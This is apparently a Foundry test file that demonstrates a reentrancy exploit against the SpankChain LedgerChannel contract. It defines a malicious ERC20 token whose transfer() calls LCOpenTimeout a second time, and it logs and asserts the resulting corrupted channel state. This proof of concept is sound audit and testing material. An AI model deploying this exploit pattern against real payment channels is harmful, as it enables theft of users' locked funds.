// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/spank_chain_payment.sol";

contract MaliciousToken is HumanStandardToken {
    LedgerChannel public lc;
    bytes32 public lcID;
    uint public count;
    bool public reentered;

    constructor() HumanStandardToken(100 ether, "Malicious", 18, "MAL") {}

    function setLedgerChannel(LedgerChannel _lc, bytes32 _lcID) public {
        lc = _lc;
        lcID = _lcID;
    }

    function attack() public {
        lc.LCOpenTimeout(lcID);
    }

    function transfer(address _to, uint256 _value) public override returns (bool) {
        count++;
        if (count == 1 && !reentered) {
            reentered = true;
            // Re-enter the vulnerable function
            lc.LCOpenTimeout(lcID);
        }
        return true;
    }
}

contract TestLedgerChannel is LedgerChannel {
    function setupChannel(
        bytes32 _lcID,
        address _party,
        address _token,
        uint256 _tokenBalance
    ) external {
        // Initialize only necessary fields for the test
        Channels[_lcID].partyAddresses[0] = _party;
        Channels[_lcID].isOpen = false;
        Channels[_lcID].LCopenTimeout = block.timestamp - 1;
        Channels[_lcID].initialDeposit[1] = 1; // Non-zero token deposit
        Channels[_lcID].erc20Balances[0] = _tokenBalance;
        Channels[_lcID].token = HumanStandardToken(_token);
    }

    // Helper function to get key channel state variables
    function getChannelState(bytes32 _lcID) public view returns (
        bool isOpen,
        uint256 initialDeposit1,
        uint256 erc20Balance0
    ) {
        Channel storage channel = Channels[_lcID];
        return (channel.isOpen, channel.initialDeposit[1], channel.erc20Balances[0]);
    }
}

contract ReentrancyTest is Test {
    TestLedgerChannel public ledgerChannel;
    MaliciousToken public maliciousToken;
    bytes32 public lcID = keccak256("vulnerable_channel");

    function setUp() public {
        ledgerChannel = new TestLedgerChannel();
        maliciousToken = new MaliciousToken();
        
        // Setup vulnerable channel
        ledgerChannel.setupChannel(
            lcID,
            address(maliciousToken),
            address(maliciousToken),
            100 ether
        );
        
        maliciousToken.setLedgerChannel(ledgerChannel, lcID);
    }

    function testReentrancy() public {
        console.log("--- BEFORE-Trigger State ---");
        uint countBefore = maliciousToken.count();
        bool reenteredBefore = maliciousToken.reentered();
        (bool isOpenBefore, uint256 initialDeposit1Before, uint256 erc20Balance0Before) = 
            ledgerChannel.getChannelState(lcID);
        
        console.log("Transfer call count:", countBefore);
        console.log("Reentered flag:", reenteredBefore);
        console.log("Channel open status:", isOpenBefore);
        console.log("Channel initial deposit[1]:", initialDeposit1Before);
        console.log("Channel ERC20 balance[0]:", erc20Balance0Before);
        
        console.log("--- Trigger Attack ---");
        maliciousToken.attack();
        
        console.log("--- AFTER-Trigger State ---");
        uint countAfter = maliciousToken.count();
        bool reenteredAfter = maliciousToken.reentered();
        (bool isOpenAfter, uint256 initialDeposit1After, uint256 erc20Balance0After) = 
            ledgerChannel.getChannelState(lcID);
        
        console.log("Transfer call count:", countAfter);
        console.log("Reentered flag:", reenteredAfter);
        console.log("Channel open status:", isOpenAfter);
        console.log("Channel initial deposit[1]:", initialDeposit1After);
        console.log("Channel ERC20 balance[0]:", erc20Balance0After);
        
        // Differential validation
        bool countIncreased = countAfter > countBefore;
        bool reentrancyTriggered = reenteredAfter;
        bool channelStateChanged = (isOpenBefore != isOpenAfter) || 
                                   (initialDeposit1Before != initialDeposit1After) ||
                                   (erc20Balance0Before != erc20Balance0After);
        
        console.log("--- DIFFERENTIAL VALIDATION ---");
        console.log("Count increased:", countIncreased);
        console.log("Reentrancy triggered:", reentrancyTriggered);
        console.log("Channel state changed:", channelStateChanged);
        
        bool vulnerabilityVerified = reentrancyTriggered && countIncreased && channelStateChanged;
        
        if (vulnerabilityVerified) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded with observable state corruption");
        } else {
            console.log("Vulnerability not Exist: No reentrancy or state changes detected");
        }

        // Original assertions
        assertTrue(maliciousToken.reentered(), "Reentrancy did not occur");
        assertEq(maliciousToken.count(), 2, "Token transfer should be called twice");
    }
}